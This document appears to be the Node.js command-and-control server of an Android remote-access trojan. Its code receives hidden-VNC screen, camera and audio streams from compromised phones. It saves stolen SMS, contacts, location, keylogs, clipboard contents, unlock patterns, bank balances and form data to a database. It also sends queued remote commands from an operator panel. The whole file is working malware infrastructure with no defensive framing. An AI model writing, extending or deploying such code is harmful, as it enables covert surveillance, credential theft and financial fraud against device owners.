'use strict';
require('dotenv').config();

const path    = require('path');
const express = require('express');
const http    = require('http');
const WebSocket = require('ws');
const cors    = require('cors');
const jwt     = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const db      = require('./db/database');
const authRoutes  = require('./routes/auth');
const { authMiddleware } = require('./middleware/auth');

const PORT          = process.env.PORT || 3000;
const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');

// ─── Express ─────────────────────────────────────────────────────────────────

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

const server = http.createServer(app);

// ─── WebSocket servers ────────────────────────────────────────────────────────
// /ws   → Android devices  (CCS binary + JSON protocol)
// /panel → Browser panel   (JSON protocol, JWT auth)

const deviceWss = new WebSocket.Server({ noServer: true, maxPayload: 50 * 1024 * 1024 });
const panelWss  = new WebSocket.Server({ noServer: true });

// Live device registry: deviceId → { ws, ip, info }
const deviceMap  = new Map();
// Authenticated panel sockets
const panelConns = new Set();

// ─── HTTP upgrade routing ─────────────────────────────────────────────────────

server.on('upgrade', (req, socket, head) => {
  const url  = new URL(req.url, 'http://x');
  const p    = url.pathname;

  if (p === '/ws') {
    deviceWss.handleUpgrade(req, socket, head, ws =>
      deviceWss.emit('connection', ws, req)
    );
  } else if (p === '/panel') {
    panelWss.handleUpgrade(req, socket, head, ws =>
      panelWss.emit('connection', ws, req)
    );
  } else {
    socket.write('HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n');
    socket.destroy();
  }
});

// ─── Panel broadcast helpers ──────────────────────────────────────────────────

function toPanel(obj) {
  const s = JSON.stringify(obj);
  panelConns.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) ws.send(s);
  });
}

function toPanelBinary(buf) {
  panelConns.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) ws.send(buf);
  });
}

// ─── /ws — Device namespace ───────────────────────────────────────────────────

deviceWss.on('connection', (ws, req) => {
  const url  = new URL(req.url, 'http://x');
  const ip   = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
             || req.socket.remoteAddress || '';

  // CCS puts device_id in query param immediately on connect
  let deviceId = url.searchParams.get('device_id') || null;
  let registered = false;

  // Auth timeout — close if no DEVICE_INFO within 15s
  const authTimer = setTimeout(() => {
    if (!registered) ws.close(4001, 'no registration');
  }, 15000);

  // ── Message handler ─────────────────────────────────────────────────────────
  ws.on('message', async (data, isBinary) => {

    // Binary = HVNC screen/camera/audio frame
    // Protocol: [type:1][size:4 BE][payload]
    // type 0x01=screen, 0x02=camera, 0x03=audio
    if (isBinary) {
      if (!deviceId) return;
      try {
        const buf  = Buffer.isBuffer(data) ? data : Buffer.from(data);
        if (buf.length < 5) return;

        const frameType = buf[0];
        const size      = buf.readUInt32BE(1);
        const payload   = buf.slice(5, 5 + size);

        // Forward to panel: [frameType:1][devIdLen:2][devId:UTF8][payload]
        const devIdBuf  = Buffer.from(deviceId, 'utf8');
        const header    = Buffer.allocUnsafe(3);
        header[0]       = frameType;
        header.writeUInt16BE(devIdBuf.length, 1);
        toPanelBinary(Buffer.concat([header, devIdBuf, payload]));

        // Throttle last_seen update (every 5s max)
        const now = Date.now();
        if (!ws._lastSeenUpdate || now - ws._lastSeenUpdate > 5000) {
          ws._lastSeenUpdate = now;
          db.query('UPDATE devices SET last_seen = NOW() WHERE id = $1', [deviceId]).catch(() => {});
        }
      } catch (e) {
        // malformed binary — ignore silently
      }
      return;
    }

    // ── Text JSON frame ────────────────────────────────────────────────────────
    let msg;
    try { msg = JSON.parse(data.toString()); } catch { return; }

    const msgType = (msg.type || '').toString().toUpperCase();

    // ── Device registration ──────────────────────────────────────────────────
    if (msgType === 'DEVICE_INFO') {
      clearTimeout(authTimer);
      registered = true;

      // Prefer query-param device_id; fall back to message body
      deviceId = deviceId || msg.device_id || uuidv4();
      deviceMap.set(deviceId, { ws, ip });

      // Store in DB
      await db.upsertDevice(deviceId, msg, ip).catch(() => {});

      // Flush queued pending commands
      const pending = await db.getCommands(deviceId, 50).catch(() => []);
      for (const cmd of pending.filter(c => c.status === 'pending')) {
        if (ws.readyState === WebSocket.OPEN) {
          // Send as bare {action, ...params} — the format CCS expects
          const payload = { action: cmd.action, ...(cmd.params || {}) };
          ws.send(JSON.stringify(payload));
          await db.updateCommand(cmd.id, 'sent').catch(() => {});
        }
      }

      // Notify panel
      toPanel({
        type: 'device_connected',
        deviceId,
        info: msg,
        ip,
        timestamp: Date.now(),
      });

      console.log(`[DEVICE] Registered: ${deviceId} (${msg.manufacturer} ${msg.model}) from ${ip}`);
      return;
    }

    if (!deviceId) return; // drop messages before we have an id

    // ── Heartbeat PING → respond PONG ────────────────────────────────────────
    if (msgType === 'PING') {
      ws.send(JSON.stringify({ type: 'PONG', timestamp: Date.now() }));
      return;
    }

    // ── All other messages: route to panel + save to DB ───────────────────────
    // Map CCS type → DB data_type
    // Map CCS outbound message type → DB data_type
    // sendResponse("TYPE", jsonString) → {"type":"TYPE","data":"..."}
    // Direct JSON objects → {"type":"TYPE", ...fields}
    const TYPE_TO_DB = {
      // sendResponse() wrappers — data field is a JSON string
      'SMS':             'sms',
      'CONTACTS':        'contacts',
      'LOCATION':        'location',
      // Direct JSON objects
      'INSTALLED_APPS':  'apps',
      'KEYLOG':          'keylog',
      'KEYLOG_OFFLINE':  'keylog',
      'CAMERA_FRAME':    'photo',
      'AUDIO_CHUNK':     'audio',
      'CLIPBOARD':       'clipboard',
      'SCREEN_HIERARCHY':'screen_hierarchy',
      'UNLOCK_SEQUENCE': 'unlock_sequence',
      'BANK_BALANCE':    'bank_balance',
      'STUDIO_FORM_DATA':'form_data',
    };

    const dbType = TYPE_TO_DB[msgType];
    if (dbType) {
      await db.saveData(deviceId, dbType, msg).catch(() => {});
    }

    // DEVICE_STATUS → update device record
    if (msgType === 'DEVICE_STATUS') {
      await db.query(
        'UPDATE devices SET current_app = $1, app_name = $2, is_locked = $3, is_screen_on = $4, last_seen = NOW() WHERE id = $5',
        [msg.package || '', msg.appName || '', msg.isLocked ?? false, msg.isScreenOn ?? true, deviceId]
      ).catch(() => {});
    }

    // SILENT_VNC_STATUS → don't save, just forward
    // OK/ERROR → command responses (update command record if we had a cmdId)
    if (msgType === 'OK' || msgType === 'ERROR' || msgType === 'PONG') {
      // These are just forwarded to panel, nothing to save
    }

    // Forward everything to panel
    toPanel({
      type: 'device_data',
      deviceId,
      msgType,
      data: msg,
      timestamp: Date.now(),
    });
  });

  // ── Disconnect ─────────────────────────────────────────────────────────────
  ws.on('close', async () => {
    clearTimeout(authTimer);
    if (deviceId) {
      deviceMap.delete(deviceId);
      await db.setDeviceOffline(deviceId).catch(() => {});
      toPanel({ type: 'device_disconnected', deviceId });
      console.log(`[DEVICE] Disconnected: ${deviceId}`);
    }
  });

  ws.on('error', err => {
    if (err.code !== 'ECONNRESET') console.error(`[DEVICE] ${deviceId}: ${err.message}`);
  });
});

// ─── /panel — Panel namespace ─────────────────────────────────────────────────

panelWss.on('connection', ws => {
  let authed = false;

  const authTimer = setTimeout(() => {
    if (!authed) ws.close(4001, 'auth timeout');
  }, 10000);

  ws.on('message', async data => {
    let msg;
    try { msg = JSON.parse(data.toString()); } catch { return; }

    // ── Auth ─────────────────────────────────────────────────────────────────
    if (msg.type === 'auth') {
      try {
        jwt.verify(msg.token, process.env.JWT_SECRET);
        clearTimeout(authTimer);
        authed = true;
        panelConns.add(ws);
        ws.send(JSON.stringify({ type: 'auth_ok' }));

        // Push device list + mark which are live
        const devices = await db.getDevices().catch(() => []);
        const withOnline = devices.map(d => ({ ...d, online: deviceMap.has(d.id) }));
        ws.send(JSON.stringify({ type: 'devices', data: withOnline }));

        console.log('[PANEL] Admin connected');
      } catch {
        ws.close(4001, 'invalid token');
      }
      return;
    }

    if (!authed) return;

    // ── Refresh devices ───────────────────────────────────────────────────────
    if (msg.type === 'get_devices') {
      const devices = await db.getDevices().catch(() => []);
      ws.send(JSON.stringify({ type: 'devices', data: devices.map(d => ({ ...d, online: deviceMap.has(d.id) })) }));
      return;
    }

    // ── Send command to device ────────────────────────────────────────────────
    if (msg.type === 'send_command') {
      const { deviceId, action, ...rest } = msg;
      delete rest.type;
      if (!deviceId || !action) return;

      const cmdId = uuidv4();

      // Persist command
      const params = {};
      Object.keys(rest).forEach(k => { params[k] = rest[k]; });
      await db.saveCommand(cmdId, deviceId, action, params).catch(() => {});

      const entry = deviceMap.get(deviceId);
      if (entry && entry.ws.readyState === WebSocket.OPEN) {
        // CCS expects bare: {"action":"X", ...params}
        const payload = JSON.stringify({ action, ...params });
        entry.ws.send(payload);
        await db.updateCommand(cmdId, 'sent').catch(() => {});
        ws.send(JSON.stringify({ type: 'command_sent', cmdId, status: 'sent', action }));
      } else {
        ws.send(JSON.stringify({ type: 'command_sent', cmdId, status: 'queued', action }));
      }
    }
  });

  ws.on('close', () => {
    clearTimeout(authTimer);
    panelConns.delete(ws);
    console.log('[PANEL] Admin disconnected');
  });

  ws.on('error', err => console.error('[PANEL]', err.message));
});

// ─── REST API ─────────────────────────────────────────────────────────────────

app.get('/health', (_req, res) =>
  res.json({ ok: true, uptime: process.uptime(), devices: deviceMap.size, panel: panelConns.size })
);

app.use('/api/auth', authRoutes);

// Helper: send command to device
async function dispatchCommand(deviceId, action, params = {}) {
  const cmdId = uuidv4();
  await db.saveCommand(cmdId, deviceId, action, params).catch(() => {});
  const entry = deviceMap.get(deviceId);
  if (entry && entry.ws.readyState === WebSocket.OPEN) {
    entry.ws.send(JSON.stringify({ action, ...params }));
    await db.updateCommand(cmdId, 'sent').catch(() => {});
    return { cmdId, status: 'sent' };
  }
  return { cmdId, status: 'queued' };
}

// All /api/* require auth
app.use('/api', authMiddleware, async (req, res) => {
  const parts = req.path.split('/').filter(Boolean);  // e.g. ['devices','abc','data','sms']

  try {
    // GET /api/devices
    if (req.method === 'GET' && parts[0] === 'devices' && !parts[1]) {
      const rows = await db.getDevices();
      return res.json(rows.map(d => ({ ...d, online: deviceMap.has(d.id) })));
    }

    // GET /api/devices/:id
    if (req.method === 'GET' && parts[0] === 'devices' && parts[1] && !parts[2]) {
      const row = await db.getDevice(parts[1]);
      if (!row) return res.status(404).json({ error: 'Not found' });
      return res.json({ ...row, online: deviceMap.has(row.id) });
    }

    // PATCH /api/devices/:id
    if (req.method === 'PATCH' && parts[0] === 'devices' && parts[1] && !parts[2]) {
      await db.updateDeviceAlias(parts[1], req.body.alias || '');
      return res.json({ ok: true });
    }

    // GET /api/devices/:id/data/:type
    if (req.method === 'GET' && parts[0] === 'devices' && parts[2] === 'data' && parts[3]) {
      const limit = Math.min(parseInt(req.query.limit) || 100, 500);
      return res.json(await db.getData(parts[1], parts[3], limit));
    }

    // POST /api/devices/:id/cmd  body: {action, param1, param2, ...}  OR  {action, params:{...}}
    if (req.method === 'POST' && parts[0] === 'devices' && parts[2] === 'cmd') {
      const { action, params: nestedParams, ...rest } = req.body;
      if (!action) return res.status(400).json({ error: 'action required' });
      // Merge nested params object + any top-level extra fields
      const allParams = { ...(nestedParams || {}), ...rest };
      return res.json(await dispatchCommand(parts[1], action, allParams));
    }

    // GET /api/devices/:id/commands
    if (req.method === 'GET' && parts[0] === 'devices' && parts[2] === 'commands') {
      return res.json(await db.getCommands(parts[1], 50));
    }

    res.status(404).json({ error: 'Not found' });
  } catch (err) {
    console.error('[API]', err.message);
    res.status(500).json({ error: err.message });
  }
});

// Serve frontend
app.use(express.static(FRONTEND_DIST));
app.get('*', (_req, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html')));

// ─── Graceful shutdown ────────────────────────────────────────────────────────

process.on('SIGTERM', () => {
  console.log('[SERVER] SIGTERM — shutting down');
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 25000);
});

// ─── Boot ─────────────────────────────────────────────────────────────────────

db.init()
  .then(() => {
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] ✓ Listening :${PORT}`);
      console.log(`[SERVER] Device WS → ws://host:${PORT}/ws`);
      console.log(`[SERVER] Panel  WS → ws://host:${PORT}/panel`);
    });
  })
  .catch(err => {
    console.error('[SERVER] DB init failed:', err.message);
    process.exit(1);
  });
